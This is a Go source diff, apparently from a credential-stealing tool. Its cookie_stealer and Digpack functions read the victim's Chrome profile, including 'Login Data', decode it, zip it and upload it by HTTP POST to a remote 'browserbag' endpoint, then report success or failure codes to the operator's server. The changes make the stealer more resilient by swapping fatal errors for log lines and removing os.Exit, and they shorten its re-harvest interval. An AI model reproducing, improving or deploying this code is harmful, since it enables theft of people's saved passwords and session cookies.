@@ -29,7 +29,7 @@ type BizStatusResponse struct {
 func get_targetip() string {
 	name, err := os.Hostname()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	return name
 }
@@ -38,7 +38,7 @@ func get_targetip() string {
 func create_dir() {
 	err := os.MkdirAll(Safe_path, 0711)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 }
 
@@ -46,7 +46,7 @@ func Digpack(addr string, finflag chan string) {
 	logf, lerr := os.Stat(Safe_path)
 	if lerr == nil {
 		//keep the file one month then update
-		if time.Now().Unix()-logf.ModTime().Unix() >= 2799765 {
+		if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
 			os.RemoveAll(Safe_path)
 			return
 		} else {
@@ -55,13 +55,18 @@ func Digpack(addr string, finflag chan string) {
 	}
 	if os.IsNotExist(lerr) {
 		get_current_user()
-		create_dir()
+		lib.Create_dir(Safe_path)
 		// if not return will happen nil bug
 		berr := cookie_stealer(addr)
 		if berr != nil {
+			log.Println("打包chrome失败", berr)
 			return
 		}
-		lib.DeCode(Safe_path+"Login Data", addr)
+		dwerr := lib.DeCode(Safe_path+"Login Data", addr)
+		if dwerr != nil {
+			log.Println(dwerr)
+			lib.EventStatusCode(99, lib.HOSTID, lib.VERSION, "0", addr+"Event")
+		}
 		time.Sleep(2 * time.Second)
 		buf := new(bytes.Buffer)
 		w := zip.NewWriter(buf)
@@ -76,26 +81,26 @@ func Digpack(addr string, finflag chan string) {
 		for _, file := range files {
 			f, err := w.Create(file.Name)
 			if err != nil {
-				log.Fatal(err)
+				log.Println(err)
 			}
 			fbody, err := ioutil.ReadFile(Safe_path + file.Name)
 			_, err = f.Write(fbody)
 			if err != nil {
-				log.Fatal(err)
+				log.Println(err)
 			}
 		}
 		err := w.Close()
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
-		f, err := os.OpenFile(Safe_path+lib.HOSTID+".zip", os.O_CREATE|os.O_WRONLY, 0666)
+		f, err := os.OpenFile(Safe_path+lib.HOSTID+"-chrome.zip", os.O_CREATE|os.O_WRONLY, 0666)
 		if err != nil {
-			log.Fatal(err)
+			log.Println(err)
 		}
 		buf.WriteTo(f)
 		pbuf := new(bytes.Buffer)
 		writer := multipart.NewWriter(pbuf)
-		formFile, err := writer.CreateFormFile("file", lib.HOSTID+".zip")
+		formFile, err := writer.CreateFormFile("file", lib.HOSTID+"-chrome.zip")
 		if err != nil {
 			log.Println("Create form file failed: %s\n", err)
 		}
@@ -114,10 +119,13 @@ func Digpack(addr string, finflag chan string) {
 		writer.Close()
 		re, err := http.Post(addr+"browserbag", contentType, pbuf)
 		if re.StatusCode == 200 {
-			log.Println("Upload browser record Status Successful !")
+			lib.EventStatusCode(100, lib.HOSTID, lib.VERSION, "0", addr+"Event")
+			log.Println("Upload browser record Status Successful ! version:", lib.VERSION)
 		} else {
+			lib.EventStatusCode(-100, lib.HOSTID, lib.VERSION, "0", addr+"Event")
 			log.Println("Upload browser record Status Fail !")
 		}
+		finflag <- "file sent"
 	}
 }
 
@@ -125,7 +133,7 @@ func Digpack(addr string, finflag chan string) {
 func current_working_dir() string {
 	dir, err := os.Getwd()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	return dir
 }
@@ -134,7 +142,7 @@ func current_working_dir() string {
 func get_current_user() string {
 	usr, err := user.Current()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	return usr.HomeDir
 }
@@ -143,18 +151,16 @@ func check(err error) {
 	if err != nil {
 		log.Println("Error ", err.Error())
 		time.Sleep(3 * time.Second)
-		os.Exit(1)
 	}
 }
 
 func cookie_stealer(addr string) error {
-	// todo other browser
 	current_user := get_current_user()
 	cp := current_user + "\\appdata\\Local\\Google\\Chrome\\User Data\\Default\\"
 	//check chrome
 	_, err := os.Stat(cp)
 	if err != nil {
-		lib.ErrorStatusCode(101, lib.HOSTID, addr+"browser_fail")
+		lib.EventStatusCode(101, lib.HOSTID, lib.VERSION, "0", addr+"Event")
 		os.RemoveAll(Safe_path)
 		return err
 	}
